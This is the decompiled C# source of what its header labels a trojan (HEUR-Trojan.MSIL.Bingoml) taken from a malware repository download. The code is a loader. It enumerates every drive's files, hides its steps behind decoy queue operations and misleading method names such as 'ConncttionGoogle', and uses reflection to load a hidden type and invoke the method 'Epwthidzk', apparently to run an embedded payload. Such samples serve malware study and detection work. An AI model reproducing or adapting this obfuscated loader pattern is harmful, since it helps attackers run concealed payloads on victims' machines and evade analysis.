// Decompiled with JetBrains decompiler
// Type: Ohrxmi.Program
// Assembly: Mhaedjy, Version=4.6.5.0, Culture=neutral, PublicKeyToken=null
// MVID: D5147E88-4426-4F99-BBCA-DD92DA902390
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-a1fb53720f755909dee2f5fe9c8015ed9b5e52817dd9a91d6ed7762eaa9faa2d.exe

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace Ohrxmi
{
  internal class Program
  {
    private static SerialQueue q;

    [STAThread]
    private static void Main() => Program.UserJob();

    private static void UserJob()
    {
      Program.q = new SerialQueue();
      try
      {
        Program.q.DispatchAsync((Action) (() =>
        {
          foreach (string logicalDrive in Environment.GetLogicalDrives())
          {
            DriveInfo driveInfo = new DriveInfo(logicalDrive);
            if (driveInfo.IsReady)
              RecursiveFileSearch.WalkDirectoryTree(driveInfo.RootDirectory);
          }
          foreach (string str in RecursiveFileSearch.log)
            Console.WriteLine(str);
        }));
        Program.q.DispatchAsync((Action) (() => Console.WriteLine((object) DateTime.Now)));
      }
      catch
      {
      }
      try
      {
        Program.q.DispatchAsync((Action) (() =>
        {
          Program.Network();
          Program.SomeNetworkRequest();
          Program.ConncttionGoogle();
        }));
      }
      catch
      {
      }
    }

    private static void Network()
    {
      Queue<int> intQueue = new Queue<int>();
      intQueue.Enqueue(5);
      intQueue.Enqueue(6);
      foreach (int num in intQueue)
        Console.WriteLine(num);
      Program.q.AsmWork();
    }

    private static void SomeNetworkRequest()
    {
      ConcurrentQueue<int> concurrentQueue = new ConcurrentQueue<int>();
      concurrentQueue.Enqueue(1);
      concurrentQueue.Enqueue(2);
      Assembly asm = Program.q.Asm as Assembly;
      concurrentQueue.Enqueue(3);
      concurrentQueue.Enqueue(4);
      Program.q.Asm = (object) asm.GetType("Ltbspuehflegncllu.Fwtidlhwfzr");
    }

    private static void ConncttionGoogle()
    {
      ConcurrentQueue<int> concurrentQueue = new ConcurrentQueue<int>();
      concurrentQueue.Enqueue(1);
      concurrentQueue.Enqueue(2);
      concurrentQueue.Enqueue(3);
      concurrentQueue.Enqueue(4);
      int result;
      Console.WriteLine(concurrentQueue.TryDequeue(out result));
      Console.WriteLine(result);
      Type asm = Program.q.Asm as Type;
      Console.WriteLine(concurrentQueue.TryDequeue(out result));
      Console.WriteLine(result);
      asm.InvokeMember("Epwthidzk", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
    }
  }
}
